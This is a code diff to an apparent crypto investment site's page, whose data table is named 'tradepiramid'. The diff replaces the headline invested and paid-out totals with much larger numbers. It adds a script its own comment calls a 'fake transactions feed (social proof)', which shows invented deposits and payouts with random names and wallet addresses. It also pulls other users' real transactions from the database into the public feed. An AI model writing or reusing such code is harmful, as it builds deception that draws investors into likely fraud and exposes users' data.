@@ -82,6 +82,14 @@
         .history-table tbody tr:hover td { background: rgba(255, 255, 255, 0.02); }
         .badge-deposit { color: var(--accent); background: rgba(0, 255, 136, 0.1); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; }
         .badge-payout { color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; }
+        .history-table tbody tr.tx-new {
+            animation: txSlideIn 0.6s ease-out;
+            background: rgba(0, 255, 136, 0.08);
+        }
+        @keyframes txSlideIn {
+            from { opacity: 0; transform: translateY(18px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
         
         .container { max-width: 1200px; margin: 0 auto; padding: 0 15px 40px; }
         .plans-grid { display: grid; grid-template-columns: 1fr; gap: 20px; margin-bottom: 30px; }
@@ -511,15 +519,15 @@
                 <div class="stat-label">Investors Online</div>
             </div>
             <div class="stat-card">
-                <div class="stat-value">$1,428,590</div>
+                <div class="stat-value">$12,847,320</div>
                 <div class="stat-label">Total Invested</div>
             </div>
             <div class="stat-card">
-                <div class="stat-value glow">$889,045</div>
+                <div class="stat-value glow">$7,215,890</div>
                 <div class="stat-label">Profit Paid Out</div>
             </div>
             <div class="stat-card">
-                <div class="stat-value">124 Days</div>
+                <div class="stat-value" id="statDays">250 Days</div>
                 <div class="stat-label">Successful Operation</div>
             </div>
         </div>
@@ -1448,6 +1456,19 @@
             saveToSupabase(email, userData);
             loadUserData(email);
 
+            // Реальный вывод — в общую ленту
+            if (typeof pushPublicTransaction === 'function') {
+                const u = (profileName && profileName.innerText) ? profileName.innerText.split('@')[0] : (email || 'user');
+                pushPublicTransaction({
+                    type: 'PAYOUT',
+                    user: maskPublicName(u),
+                    amount: amount,
+                    method: system,
+                    status: 'Sent',
+                    real: true
+                });
+            }
+
             showCustomAlert(`Withdrawal request for $${amount} successfully created!`, 'Success');
             closeModal();
         }
@@ -1756,16 +1777,17 @@
             saveToSupabase(email, userData);
             loadUserData(email);
 
-            const table = document.getElementById('historyTableBody');
-            const newRow = document.createElement('tr');
-            newRow.innerHTML = `
-                <td><span class="badge-deposit">DEPOSIT</span></td>
-                <td>${userText}***</td>
-                <td style="font-weight: 600;">${checkAmount.innerText}</td>
-                <td>${currentMethodName}</td>
-                <td style="color: var(--accent); font-weight: 600;">Completed</td>
-            `;
-            table.insertBefore(newRow, table.firstChild);
+            // Реальная покупка — в общую ленту Latest Transactions
+            if (typeof pushPublicTransaction === 'function') {
+                pushPublicTransaction({
+                    type: 'DEPOSIT',
+                    user: maskPublicName(userText || email),
+                    amount: amount,
+                    method: currentMethodName,
+                    status: 'Completed',
+                    real: true
+                });
+            }
         }
 
         function resetModal() {
@@ -1828,6 +1850,178 @@
         }, 1000);
     </script>
     <script>
+
+        /* ===== Live fake transactions feed (social proof) ===== */
+
+        function maskPublicName(raw) {
+            if (!raw) return 'user***00';
+            let s = String(raw).replace(/@.*/, '').replace(/[^a-zA-Z0-9]/g, '');
+            if (s.length < 2) s = 'user';
+            const keep = Math.min(4, s.length);
+            const suf = String(Math.floor(10 + Math.random() * 89));
+            return s.slice(0, keep).toLowerCase() + '***' + suf;
+        }
+
+        function pushPublicTransaction(tx) {
+            const tbody = document.getElementById('historyTableBody');
+            if (!tbody || !tx) return;
+            const isDep = (tx.type === 'DEPOSIT');
+            const tr = document.createElement('tr');
+            tr.className = 'tx-new';
+            if (tx.real) tr.setAttribute('data-real', '1');
+            const amountStr = (typeof tx.amount === 'number') ? ('$' + tx.amount) : String(tx.amount);
+            tr.innerHTML =
+                '<td><span class="' + (isDep ? 'badge-deposit' : 'badge-payout') + '">' + (tx.type || 'DEPOSIT') + '</span></td>' +
+                '<td>' + (tx.user || 'user***00') + '</td>' +
+                '<td style="font-weight: 600;">' + amountStr + '</td>' +
+                '<td>' + (tx.method || '—') + '</td>' +
+                '<td style="color: var(--accent); font-weight: 600;">' + (tx.status || 'Completed') + '</td>';
+            tbody.insertBefore(tr, tbody.firstChild);
+            // максимум 3: сначала убираем фейки снизу, потом любые
+            while (tbody.children.length > 3) {
+                let removed = false;
+                for (let i = tbody.children.length - 1; i >= 0; i--) {
+                    if (tbody.children[i].getAttribute('data-real') !== '1') {
+                        tbody.removeChild(tbody.children[i]);
+                        removed = true;
+                        break;
+                    }
+                }
+                if (!removed) tbody.removeChild(tbody.lastChild);
+            }
+            setTimeout(function() { tr.classList.remove('tx-new'); }, 800);
+        }
+
+        (function initLiveTransactions() {
+            const NAMES = [
+                'alex','crypto','invest','max','anna','serg','dima','kate','john','mike',
+                'lena','ivan','roma','nina','paul','olga','art','vlad','tina','den',
+                'mark','sofia','leo','kira','nik','eva','dan','mira','tony','lara'
+            ];
+            const SUFFIXES = ['99','77','21','07','88','42','13','56','03','19','64','11'];
+            const METHODS_DEP = [
+                function() { return 'USDT TRC20 (T' + randHex(3) + '...' + randHex(5) + ')'; },
+                function() { return 'Bitcoin (1' + randHex(3) + '...' + randHex(3) + ')'; },
+                function() { return 'Ethereum (0x' + randHex(4) + '...' + randHex(4) + ')'; },
+                function() { return 'Bank Card (4276***' + Math.floor(10 + Math.random() * 89) + ')'; }
+            ];
+            const METHODS_OUT = [
+                function() { return 'USDT TRC20 (T' + randHex(3) + '...' + randHex(5) + ')'; },
+                function() { return 'Bitcoin (1' + randHex(3) + '...' + randHex(3) + ')'; },
+                function() { return 'Bank Card (5469***' + Math.floor(10 + Math.random() * 89) + ')'; },
+                function() { return 'Ethereum (0x' + randHex(3) + '...' + randHex(4) + ')'; }
+            ];
+            const DEP_AMOUNTS = [25, 30, 50, 75, 90, 100, 120, 150, 200, 250, 300, 400, 500, 750, 1000, 50, 80, 110];
+            const OUT_AMOUNTS = [18, 35, 45, 60, 80, 95, 120, 150, 180, 220, 280, 350, 75, 90];
+
+            function randHex(n) {
+                const c = 'abcdef0123456789';
+                let s = '';
+                for (let i = 0; i < n; i++) s += c[Math.floor(Math.random() * c.length)];
+                return s;
+            }
+            function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+            function maskName() {
+                const n = randItem(NAMES);
+                const suf = randItem(SUFFIXES);
+                return n.slice(0, Math.min(4, n.length)) + '***' + suf;
+            }
+            function appendFakeTx() {
+                const isDep = Math.random() < 0.62;
+                pushPublicTransaction({
+                    type: isDep ? 'DEPOSIT' : 'PAYOUT',
+                    user: maskName(),
+                    amount: isDep ? randItem(DEP_AMOUNTS) : randItem(OUT_AMOUNTS),
+                    method: isDep ? randItem(METHODS_DEP)() : randItem(METHODS_OUT)(),
+                    status: isDep ? (Math.random() < 0.85 ? 'Completed' : 'Processing') : (Math.random() < 0.8 ? 'Sent' : 'Processing'),
+                    real: false
+                });
+            }
+
+            // Подтянуть реальные недавние операции других пользователей из Supabase
+            var seenRealKeys = {};
+            async function pullRealFromSupabase() {
+                if (!supabaseClient) return;
+                try {
+                    var res = await supabaseClient.from('tradepiramid').select('username,user_data').limit(40);
+                    if (!res || !res.data) return;
+                    var candidates = [];
+                    res.data.forEach(function(row) {
+                        var ud = row.user_data;
+                        try { if (typeof ud === 'string') ud = JSON.parse(ud); } catch (e) { return; }
+                        if (!ud || !Array.isArray(ud.transactions)) return;
+                        var uname = row.username || 'user';
+                        ud.transactions.slice(0, 3).forEach(function(tx) {
+                            if (!tx || !tx.type) return;
+                            var key = uname + '|' + tx.type + '|' + tx.amount + '|' + (tx.date || '') + '|' + (tx.startDate || '');
+                            if (seenRealKeys[key]) return;
+                            var isDep = tx.type === 'DEPOSIT';
+                            var isOut = tx.type === 'WITHDRAWAL' || tx.type === 'PAYOUT';
+                            if (!isDep && !isOut) return;
+                            candidates.push({
+                                key: key,
+                                type: isDep ? 'DEPOSIT' : 'PAYOUT',
+                                user: maskPublicName(uname),
+                                amount: tx.amount,
+                                method: tx.method || (isDep ? 'USDT TRC20' : 'USDT TRC20'),
+                                status: isDep ? 'Completed' : (tx.status === 'Processing' ? 'Processing' : 'Sent'),
+                                real: true,
+                                ts: tx.startDate || 0
+                            });
+                        });
+                    });
+                    candidates.sort(function(a, b) { return (b.ts || 0) - (a.ts || 0); });
+                    // покажем одну свежую реальную, которую ещё не показывали
+                    for (var i = 0; i < candidates.length; i++) {
+                        var c = candidates[i];
+                        if (seenRealKeys[c.key]) continue;
+                        seenRealKeys[c.key] = true;
+                        pushPublicTransaction(c);
+                        break;
+                    }
+                } catch (e) {
+                    console.warn('pullRealFromSupabase', e);
+                }
+            }
+
+            function scheduleNext() {
+                var delay = 5000 + Math.floor(Math.random() * 5000);
+                setTimeout(function() {
+                    if (Math.random() < 0.35) {
+                        pullRealFromSupabase().then(function() {
+                            // если реальных свежих нет — лента всё равно оживёт фейком иногда
+                        });
+                    } else {
+                        appendFakeTx();
+                    }
+                    scheduleNext();
+                }, delay);
+            }
+            setTimeout(function() {
+                pullRealFromSupabase();
+                setTimeout(appendFakeTx, 4000);
+                scheduleNext();
+            }, 2500);
+        })();
+
+
+        // Счётчик дней работы сайта (растёт каждый день)
+        (function updateOperationDays() {
+            // Дата запуска: от неё считается число дней (сейчас ≈ 250)
+            var LAUNCH = new Date('2026-01-16T00:00:00Z');
+            function render() {
+                var el = document.getElementById('statDays');
+                if (!el) return;
+                var now = new Date();
+                var days = Math.floor((now - LAUNCH) / 86400000);
+                if (days < 1) days = 1;
+                el.textContent = days + ' Days';
+            }
+            render();
+            // обновлять раз в час на случай открытой вкладки через полночь
+            setInterval(render, 60 * 60 * 1000);
+        })();
+
         if ('scrollRestoration' in history) {
             history.scrollRestoration = 'manual';
         }
